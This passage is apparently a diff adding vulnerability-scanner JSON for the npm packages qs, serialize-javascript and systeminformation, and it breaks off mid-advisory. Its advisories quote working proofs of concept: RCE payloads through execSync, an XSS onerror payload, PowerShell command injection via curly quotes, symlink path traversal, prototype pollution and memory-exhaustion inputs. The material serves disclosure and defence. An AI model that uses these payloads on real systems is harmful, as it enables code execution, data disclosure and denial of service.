+                    "ecosystem": "npm",
+                    "name": "qs",
+                    "purl": "pkg:npm/qs"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "6.14.2"
+                        },
+                        {
+                          "fixed": "6.16.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-82562"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-770"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-09-02T14:46:57Z",
+                "nvd_published_at": "2026-08-30T01:20:32Z",
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\n\n`qs` `v6.15.3` allows bracket-key input to bypass `arrayLimit` and `throwOnLimitExceeded` when `comma: true`. The input `a[]=1,2,3,4` succeeds with `arrayLimit: 3`, while the equivalent plain-key input is rejected.\n\nAffected version tested:\n\n```text\nqs v6.15.3\ncommit 18d085e919dae70c8f1b200ab99323058edab2c2\n```\n\n### Details\n\n`parseArrayValue()` enforces the comma limit only for flat values. The `a[]` form is marked non-flat, so its comma-separated value is wrapped after parsing and the inner array is not checked. A single parameter can therefore materialize arbitrarily large arrays.\n\n### PoC\n\n```js\nconst qs = require('qs')\nconst options = { comma: true, arrayLimit: 3, throwOnLimitExceeded: true }\n\nconst result = qs.parse('a[]=1,2,3,4', options)\nconsole.log(result.a[0].length) // 4; expected RangeError\n\nconst big = qs.parse('a[]=' + '1,'.repeat(1000000) + '1', { comma: true, arrayLimit: 20 })\nconsole.log(big.a[0].length) // 1000001\n```\n\nOn `v6.15.3`, the first input parses successfully and the second creates an array with 1,000,001 elements. The equivalent `a=1,2,3,4` input throws `RangeError` as expected.\n\n### Impact\n\nAn attacker who can supply a query string or form body can bypass configured array limits and force excessive memory allocation, causing denial of service. The limit must be applied after comma splitting and before the resulting array is wrapped.",
+              "id": "GHSA-x5fp-wj9c-mxmx",
+              "modified": "2026-09-10T03:50:54.569331980Z",
+              "published": "2026-09-02T14:46:57Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ljharb/qs/security/advisories/GHSA-w7fw-mjwx-w883"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ljharb/qs/security/advisories/GHSA-x5fp-wj9c-mxmx"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-82562"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ljharb/qs/commit/8859c37470e11b42b547b275e4e9bd0bc8cc5464"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/ljharb/qs"
+                }
+              ],
+              "related": [
+                "CVE-2026-82562"
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+                  "type": "CVSS_V3"
+                },
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "qs array-limit bypass via bracket-key comma parsing"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "serialize-javascript",
+            "version": "6.0.2",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/serialize-javascript@6.0.2?source=PUBLIC_REGISTRY"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-5c6j-r48x-rmvq"
+              ],
+              "aliases": [
+                "GHSA-5c6j-r48x-rmvq"
+              ],
+              "max_severity": "8.1"
+            },
+            {
+              "ids": [
+                "GHSA-m5mm-p8h7-m29v"
+              ],
+              "aliases": [
+                "CVE-2026-115754",
+                "CVE-2026-115897",
+                "GHSA-m5mm-p8h7-m29v"
+              ],
+              "max_severity": "2.1"
+            },
+            {
+              "ids": [
+                "GHSA-qj8w-gfj5-8c6v"
+              ],
+              "aliases": [
+                "CVE-2026-34043",
+                "GHSA-qj8w-gfj5-8c6v"
+              ],
+              "max_severity": "5.9"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 7.0.2",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-5c6j-r48x-rmvq/GHSA-5c6j-r48x-rmvq.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "serialize-javascript",
+                    "purl": "pkg:npm/serialize-javascript"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "7.0.3"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-96"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-02-28T02:50:45Z",
+                "nvd_published_at": null,
+                "severity": "HIGH"
+              },
+              "details": "### Impact\n\nThe serialize-javascript npm package (versions \u003c= 7.0.2) contains a code injection vulnerability. It is an incomplete fix for CVE-2020-7660.\n\nWhile `RegExp.source` is sanitized, `RegExp.flags` is interpolated directly into the generated output without escaping. A similar issue exists in `Date.prototype.toISOString()`.\n\nIf an attacker can control the input object passed to `serialize()`, they can inject malicious JavaScript via the flags property of a RegExp object. When the serialized string is later evaluated (via `eval`, `new Function`, or `\u003cscript\u003e` tags), the injected code executes.\n\n```javascript\nconst serialize = require('serialize-javascript');\n// Create an object that passes instanceof RegExp with a spoofed .flags\nconst fakeRegex = Object.create(RegExp.prototype);\nObject.defineProperty(fakeRegex, 'source', { get: () =\u003e 'x' });\nObject.defineProperty(fakeRegex, 'flags', {\n  get: () =\u003e '\"+(global.PWNED=\"CODE_INJECTION_VIA_FLAGS\")+\"'\n});\nfakeRegex.toJSON = function() { return '@placeholder'; };\nconst output = serialize({ re: fakeRegex });\n// Output: {\"re\":new RegExp(\"x\", \"\"+(global.PWNED=\"CODE_INJECTION_VIA_FLAGS\")+\"\")}\nlet obj;\neval('obj = ' + output);\nconsole.log(global.PWNED); // \"CODE_INJECTION_VIA_FLAGS\" — injected code executed!\n#h2. PoC 2: Code Injection via Date.toISOString()\n```\n\n```javascript\nconst serialize = require('serialize-javascript');\nconst fakeDate = Object.create(Date.prototype);\nfakeDate.toISOString = function() { return '\"+(global.DATE_PWNED=\"DATE_INJECTION\")+\"'; };\nfakeDate.toJSON = function() { return '2024-01-01'; };\nconst output = serialize({ d: fakeDate });\n// Output: {\"d\":new Date(\"\"+(global.DATE_PWNED=\"DATE_INJECTION\")+\"\")}\neval('obj = ' + output);\nconsole.log(global.DATE_PWNED); // \"DATE_INJECTION\" — injected code executed!\n#h2. PoC 3: Remote Code Execution\n```\n\n```javascript\nconst serialize = require('serialize-javascript');\nconst rceRegex = Object.create(RegExp.prototype);\nObject.defineProperty(rceRegex, 'source', { get: () =\u003e 'x' });\nObject.defineProperty(rceRegex, 'flags', {\n  get: () =\u003e '\"+require(\"child_process\").execSync(\"id\").toString()+\"'\n});\nrceRegex.toJSON = function() { return '@rce'; };\nconst output = serialize({ re: rceRegex });\n// Output: {\"re\":new RegExp(\"x\", \"\"+require(\"child_process\").execSync(\"id\").toString()+\"\")}\n// When eval'd on a Node.js server, executes the \"id\" system command\n```\n\n### Patches\n\nThe fix has been published in version 7.0.3. https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.3",
+              "id": "GHSA-5c6j-r48x-rmvq",
+              "modified": "2026-09-10T03:50:34.154574250Z",
+              "published": "2026-02-28T02:50:45Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/yahoo/serialize-javascript/security/advisories/GHSA-5c6j-r48x-rmvq"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-7660"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/yahoo/serialize-javascript/commit/2e609d0a9f4f5b097f0945af88bd45b9c7fb48d9"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://github.com/advisories/GHSA-hxcc-f52p-wc94"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/yahoo/serialize-javascript"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.3"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Serialize JavaScript is Vulnerable to RCE via RegExp.flags and Date.prototype.toISOString()"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-m5mm-p8h7-m29v/GHSA-m5mm-p8h7-m29v.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "serialize-javascript",
+                    "purl": "pkg:npm/serialize-javascript"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "7.1.3"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-115754",
+                "CVE-2026-115897"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-79"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-10-23T22:09:52Z",
+                "nvd_published_at": null,
+                "severity": "LOW"
+              },
+              "details": "### Impact\n\n`serialize-javascript` escapes its output so it is safe to embed inside a\n`\u003cscript\u003e` element. Before 7.1.3 that guarantee did not hold for a **function\nvalue whose source ends in a bare `\u003c/script`**.\n\nEach function body is escaped on its own, and a bare `\u003c/script` was only\nneutralized when followed — within the same body — by a character the HTML\ntokenizer treats as ending the tag name (TAB, LF, FF, CR, SPACE, `/` or `\u003e`).\nA body ending exactly at `\u003c/script` has no following character, so it was\nemitted unescaped. The delimiter is then supplied by the surrounding output\n(for example the newline the `space` option emits after the value), and a\nlater serialized value can supply the closing `\u003e` followed by markup:\n\n```js\nconst serialize = require('serialize-javascript');\nfunction f() {} f.toString = () =\u003e 'function f(){ return 1 }//\u003c/script';\nfunction g() {} g.toString = () =\u003e 'function g(x){ return x } \u003e \u003cimg src=x onerror=alert(1)\u003e';\nserialize({ a: { f }, g }, { space: 2 });\n// {\n//   \"a\": {\n//     \"f\": function f(){ return 1 }//\u003c/script\n//   },\n//   \"g\": function g(x){ return x } \u003e \u003cimg src=x onerror=alert(1)\u003e\n// }\n```\n\nEmbedded in a `\u003cscript\u003e` element, the script ends at the injected tag and the\n`\u003cimg\u003e` becomes a live element in the page.\n\nExploitation requires an attacker to control the **source text** of a\nserialized function, in practice through a spoofed `toString()`. Real\nfunctions always end in `}`, so ordinary function values are not affected,\nand non-function values (including strings containing `\u003c/script`) are\nescaped correctly.\n\n### Patches\n\nFixed in **7.1.3** (#235). The bare `\u003c/script` form is now also matched at\nthe end of the function body, so it is escaped regardless of what follows it\nin the output.\n\n### Workarounds\n\nUpgrade to **7.1.3**. If you cannot upgrade, do not serialize function values\nwhose source text (or `toString()`) can be influenced by an attacker.\n\n### Credits\n\nReported by **ha_kr25** via the Yahoo bug bounty program.",
+              "id": "GHSA-m5mm-p8h7-m29v",
+              "modified": "2026-10-24T02:55:55.507718062Z",
+              "published": "2026-10-23T22:09:52Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/yahoo/serialize-javascript/security/advisories/GHSA-m5mm-p8h7-m29v"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/yahoo/serialize-javascript/pull/235"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/yahoo/serialize-javascript/commit/2864b3c6260a3bfd52d2db3e70d1a079de108a61"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/yahoo/serialize-javascript"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/yahoo/serialize-javascript/releases/tag/v7.1.3"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:H/AT:P/PR:L/UI:P/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "Serialize JavaScript: Cross-site scripting (XSS) via unescaped \u003c/script at the end of a serialized function body"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-qj8w-gfj5-8c6v/GHSA-qj8w-gfj5-8c6v.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "serialize-javascript",
+                    "purl": "pkg:npm/serialize-javascript"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "5.0.0"
+                        },
+                        {
+                          "fixed": "7.0.5"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-34043"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-400",
+                  "CWE-834"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-03-27T18:18:54Z",
+                "nvd_published_at": "2026-03-31T03:15:58Z",
+                "severity": "MODERATE"
+              },
+              "details": "### Impact\n\n**What kind of vulnerability is it?**\n\nIt is a **Denial of Service (DoS)** vulnerability caused by CPU exhaustion. When serializing a specially crafted \"array-like\" object (an object that inherits from `Array.prototype` but has a very large `length` property), the process enters an intensive loop that consumes 100% CPU and hangs indefinitely.\n\n**Who is impacted?**\n\nApplications that use `serialize-javascript` to serialize untrusted or user-controlled objects are at risk. While direct exploitation is difficult, it becomes a high-priority threat if the application is also vulnerable to **Prototype Pollution** or handles untrusted data via **YAML Deserialization**, as these could be used to inject the malicious object.\n\n### Patches\n\n**Has the problem been patched?**\n\nYes, the issue has been patched by replacing `instanceof Array` checks with `Array.isArray()` and using `Object.keys()` for sparse array detection.\n\n**What versions should users upgrade to?**\n\nUsers should upgrade to **`v7.0.5`** or later.\n\n### Workarounds\n\n**Is there a way for users to fix or remediate the vulnerability without upgrading?**\n\nThere is no direct code-level workaround within the library itself. However, users can mitigate the risk by:\n\n* Validating and sanitizing all input before passing it to the `serialize()` function.\n* Ensuring the environment is protected against Prototype Pollution.\n* Upgrading to **`v7.0.5`** as soon as possible.\n\n### Acknowledgements\n\nSerialize JavaScript thanks **Tomer Aberbach** (@TomerAberbach) for discovering and privately disclosing this issue.",
+              "id": "GHSA-qj8w-gfj5-8c6v",
+              "modified": "2026-09-10T03:50:40.557735802Z",
+              "published": "2026-03-27T18:18:54Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/yahoo/serialize-javascript/security/advisories/GHSA-qj8w-gfj5-8c6v"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-34043"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/yahoo/serialize-javascript/commit/f147e90269b58bb6e539cfdf3d0e20d6ad14204b"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/yahoo/serialize-javascript"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/yahoo/serialize-javascript/releases/tag/v5.0.0"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.5"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Serialize JavaScript has CPU Exhaustion Denial of Service via crafted array-like objects"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "systeminformation",
+            "version": "5.31.7",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/systeminformation@5.31.7?source=PUBLIC_REGISTRY"
+          },
+          "dependency_groups": [
+            "dev"
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-3f7j-7jwc-fxfj"
+              ],
+              "aliases": [
+                "CVE-2026-116576",
+                "GHSA-3f7j-7jwc-fxfj"
+              ],
+              "max_severity": "7.8"
+            },
+            {
+              "ids": [
+                "GHSA-4vjg-vx72-qq4g"
+              ],
+              "aliases": [
+                "CVE-2026-116673",
+                "GHSA-4vjg-vx72-qq4g"
+              ],
+              "max_severity": "3.3"
+            },
+            {
+              "ids": [
+                "GHSA-7648-jmwf-vw7j"
+              ],
+              "aliases": [
+                "CVE-2026-116674",
+                "GHSA-7648-jmwf-vw7j"
+              ],
+              "max_severity": "6.5"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-3f7j-7jwc-fxfj/GHSA-3f7j-7jwc-fxfj.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "systeminformation",
+                    "purl": "pkg:npm/systeminformation"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "5.33.16"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-116576"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-78"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-10-28T22:42:49Z",
+                "nvd_published_at": "2026-10-26T21:18:13Z",
+                "severity": "HIGH"
+              },
+              "details": "### Summary\n\nOn Windows, `systeminformation@5.33.15` builds a PowerShell command using the value passed to `services()`. The default sanitizer removes ASCII quotes but keeps Unicode curly quotes, spaces, and parentheses. A crafted service name can use those characters to break out of the generated filter string and run a PowerShell expression. The expression runs with the permissions of the Node.js process.\n\nThis report confirms version `5.33.15`. Other package versions have not been checked.\n\n### Details\n\nIn `lib/processes.js`, `services()` sanitizes the caller's string with `sanitizeShellString()` and later inserts each resulting name into a `Get-CimInstance Win32_Service -Filter` command. The Windows branch passes that command to `util.powerShell()`.\n\nThe sanitizer in `lib/util.js` removes the ASCII double quote, but it does not remove U+201C or U+201D, the left and right curly double quotation marks. It also permits spaces and parentheses when called in its default, non-strict mode. PowerShell accepts the curly marks as string delimiters, so an input can end the filter string and place a command expression in the generated command.\n\nFor example, the input below uses curly quotation marks to end the generated filter string and execute `New-Item`. I reproduced this call on Windows against the checked-out `systeminformation@5.33.15` source; it created a marker file with the Node.js process account.\n\n### Proof of concept\n\nRun this on Windows in a disposable directory with Node.js and PowerShell available:\n\n```powershell\nmkdir si-command-injection-repro\ncd si-command-injection-repro\nnpm init -y\nnpm install systeminformation@5.33.15\n```\n\nSave the following as `poc.cjs`, then run `node poc.cjs`:\n\n```js\n'use strict';\n\nconst fs = require('node:fs');\nconst path = require('node:path');\nconst si = require('systeminformation');\n\n(async () =\u003e {\n  const markerName = `si-injection-${process.pid}.txt`;\n  const markerPath = path.join(process.cwd(), markerName);\n  fs.rmSync(markerPath, { force: true });\n\n  try {\n    await si.services(`not-a-service” (New-Item -Name ${markerName} -ItemType File -Force) “`);\n    console.log(`markerCreated=${fs.existsSync(markerPath)}`);\n  } finally {\n    fs.rmSync(markerPath, { force: true });\n  }\n})().catch((error) =\u003e {\n  console.error(error);\n  process.exitCode = 1;\n});\n```\n\nExpected output:\n\n```text\nmarkerCreated=true\n```\n\nThe Windows run returned an array and created the marker (`markerCreated: true`). A benign input left the marker absent. The script removes the marker afterward. I did not identify an application network route that forwards remote input to `services()`, so remote exploitability depends on the consuming application.\n\n### Impact\n\nAn application that passes attacker-controlled input to `services()` on Windows can execute PowerShell commands with the Node.js process account's permissions. Depending on that account, commands may read or change accessible files, alter application data, or disrupt the service. I searched this repository for HTTP servers, route handlers, and listener calls and found none. `services()` is exposed through the package API and `getDynamicData()`, so a consuming application could make the input network-reachable if it forwards request data. A separate loopback HTTP harness did trigger the command through a query parameter, but that server was test code and is not part of this repository. The project's `docs/security.html` already warns that arbitrary untrusted input to `services()` needs caution because package sanitization does not cover every case.",
+              "id": "GHSA-3f7j-7jwc-fxfj",
+              "modified": "2026-10-28T23:00:04.050952274Z",
+              "published": "2026-10-28T22:42:49Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-3f7j-7jwc-fxfj"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-116576"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/sebhildebrandt/systeminformation/commit/5014c6d25cfce7363b937977327baa853cdba0bf"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/sebhildebrandt/systeminformation"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/sebhildebrandt/systeminformation/releases/tag/v5.33.16"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "systeminformation vulnerable to Windows command injection in services() through Unicode quotation marks"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-4vjg-vx72-qq4g/GHSA-4vjg-vx72-qq4g.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "systeminformation",
+                    "purl": "pkg:npm/systeminformation"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "5.33.14"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-116673"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-22",
+                  "CWE-59"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-10-28T21:13:50Z",
+                "nvd_published_at": "2026-10-27T17:16:59Z",
+                "severity": "LOW"
+              },
+              "details": "### Summary\n\nOn Linux, `systeminformation@5.33.13` builds `/sys/class/net/\u003ciface\u003e` paths from the caller-supplied `networkStats(iface)` value without checking that the resolved path stays inside `/sys/class/net`. A caller who can create a symlink fixture and control the value passed to this API can make the function return the first line of a file readable by the Node process.\n\n### Details\n\nThe strict string sanitizer removes shell metacharacters but retains `/` and `.`. The Linux implementation uses this value in an `fs.existsSync('/sys/class/net/' + iface)` check and then in seven `cat` paths for interface statistics. Both operations follow `..` path components and symlinks. The code does not validate the value as an interface name or enforce resolved-path containment.\n\nThe proof of concept below creates the expected statistics files in a directory writable by the unprivileged `nobody` user. Its `operstate` symlink points to a synthetic mode-0600 file under `/root`. The package call runs as root and returns the marker even though `nobody` cannot read that file.\n\n### PoC\n\nUse a disposable Ubuntu Linux VM with Node.js, npm, and `runuser` installed. These steps create and remove only a synthetic marker and a temporary fixture. Install the affected version:\n\n```sh\nmkdir si-netstats-repro\ncd si-netstats-repro\nnpm init -y\nnpm install systeminformation@5.33.13\n```\n\nSave the following as `poc.cjs` in that directory, then run `sudo node poc.cjs`:\n\n```js\n'use strict';\n\nconst fs = require('node:fs');\nconst { execFileSync } = require('node:child_process');\nconst si = require('systeminformation');\n\nconst root = `/tmp/si-netstats-${process.pid}`;\nconst secret = `/root/si-netstats-secret-${process.pid}`;\nconst marker = `SYNTHETIC_ROOT_ONLY_MARKER_${process.pid}`;\nconst fixtureCode = `\n  const fs = require('node:fs');\n  const root = process.env.SI_FIXTURE_ROOT;\n  const secret = process.env.SI_SECRET;\n  fs.mkdirSync(root + '/statistics', { recursive: true });\n  for (const name of ['rx_bytes', 'tx_bytes', 'rx_dropped', 'rx_errors', 'tx_dropped', 'tx_errors']) {\n    fs.writeFileSync(root + '/statistics/' + name, '0\\\\n');\n  }\n  fs.symlinkSync(secret, root + '/operstate');\n`;\n\n(async () =\u003e {\n  try {\n    fs.writeFileSync(secret, marker + '\\\\n', { mode: 0o600 });\n    fs.chmodSync(secret, 0o600);\n\n    execFileSync('runuser', [\n      '-u', 'nobody', '--', 'env',\n      `SI_FIXTURE_ROOT=${root}`,\n      `SI_SECRET=${secret}`,\n      process.execPath, '-e', fixtureCode\n    ], { stdio: 'inherit' });\n\n    let nobodyCouldRead = true;\n    try {\n      execFileSync('runuser', ['-u', 'nobody', '--', 'cat', secret], { stdio: 'ignore' });\n    } catch {\n      nobodyCouldRead = false;\n    }\n    if (nobodyCouldRead) throw new Error('negative control failed: nobody read the marker');\n\n    const iface = '../'.repeat(24) + root.slice(1);\n    const rows = await si.networkStats(iface);\n    const returned = String(rows[0]?.operstate ?? '').trim();\n    const success = returned === marker;\n\n    console.log(JSON.stringify({\n      nobodyCouldRead,\n      libraryReturnedRootOnlyMarker: success,\n      returnedOperstate: returned\n    }, null, 2));\n\n    if (!success) process.exitCode = 1;\n  } finally {\n    fs.rmSync(root, { recursive: true, force: true });\n    fs.rmSync(secret, { force: true });\n  }\n})().catch((error) =\u003e {\n  console.error(error);\n  process.exitCode = 1;\n});\n```\n\nExpected result:\n\n```json\n{\n  \"nobodyCouldRead\": false,\n  \"libraryReturnedRootOnlyMarker\": true,\n  \"returnedOperstate\": \"SYNTHETIC_ROOT_ONLY_MARKER_\u003cpid\u003e\"\n}\n```\n\n### Impact\n\nThe demonstrated impact is disclosure to the API caller of the first line of a file readable by the Node process. The package is a library and does not expose a network endpoint. A consuming application route that forwards remote attacker input to this API and returns its result was not established, so remote exploitability is not demonstrated.",
+              "id": "GHSA-4vjg-vx72-qq4g",
+              "modified": "2026-10-28T21:30:05.793647178Z",
+              "published": "2026-10-28T21:13:50Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-4vjg-vx72-qq4g"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-116673"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/sebhildebrandt/systeminformation/commit/8d294b3139fec654a912969ac898037578a218cd"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/sebhildebrandt/systeminformation"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/sebhildebrandt/systeminformation/releases/tag/v5.33.14"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "systeminformation has path traversal in Linux networkStats() that allows symlink-based file disclosure outside /sys/class/net"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-7648-jmwf-vw7j/GHSA-7648-jmwf-vw7j.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "systeminformation",
+                    "purl": "pkg:npm/systeminformation"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "5.33.13"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-116674"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1321"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-10-28T21:13:32Z",
+                "nvd_published_at": "2026-10-27T17:16:59Z",
+                "severity": "MODERATE"
+              },
+              "details": "## Summary\n\n`networkStats()` keeps a per interface cache for computing `rx_sec` / `tx_sec` between calls.\nThe cache is a plain JavaScript object and is indexed with the interface name the caller\nsupplied. Passing the name `__proto__` makes every cache write land on `Object.prototype`\ninstead of the cache, polluting every object in the Node.js process.\n\nAn application is affected if it passes untrusted input as the `ifaces` argument of\n`si.networkStats()` and runs on FreeBSD, OpenBSD or NetBSD.\n\n## Details\n\n### The vulnerable code\n\n`lib/network.js` declares the cache as a plain object:\n\n```js\nconst _network = {};\n```\n\n`calcNetworkSpeed()` writes into it, keyed by the interface name:\n\n```js\n} else {\n  if (!_network[iface]) {\n    _network[iface] = {};\n  }\n  _network[iface].rx_bytes  = rx_bytes;\n  _network[iface].tx_bytes  = tx_bytes;\n  _network[iface].rx_sec    = null;\n  _network[iface].tx_sec    = null;\n  _network[iface].ms        = Date.now();\n  _network[iface].last_ms   = 0;\n  _network[iface].operstate = operstate;\n}\n```\n\nWith `iface === '__proto__'` this misbehaves twice:\n\n1. `_network['__proto__']` does not read a missing own property — it invokes the inherited\n   `__proto__` getter and returns `Object.prototype`, which is truthy. The\n   `if (!_network[iface])` guard therefore never creates the `{}` placeholder.\n2. Each following assignment writes onto `Object.prototype`.\n\nAfter one call, `rx_bytes`, `tx_bytes`, `rx_sec`, `tx_sec`, `ms`, `last_ms` and `operstate`\nare visible on **every** object in the process. A second call takes the other branch\n(`_network['__proto__'].ms` is now truthy) and keeps them updated.\n\n### Why the existing sanitizing does not help\n\nThe interface name does pass through `util.sanitizeString(iface, true)` before it is used as\nthe cache key. That function is a **shell metacharacter** filter, built to stop command\ninjection in the `netstat` / `ifconfig` invocations — a different threat. Property names made\nof letters and underscores are legitimate interface names and pass through untouched:\n\n```\n\"a;id\"        -\u003e \"aid\"\n\"a$(id)\"      -\u003e \"aid\"\n\"a|id\"        -\u003e \"aid\"\n\"a`id`\"       -\u003e \"aid\"\n\"__proto__\"   -\u003e \"__proto__\"     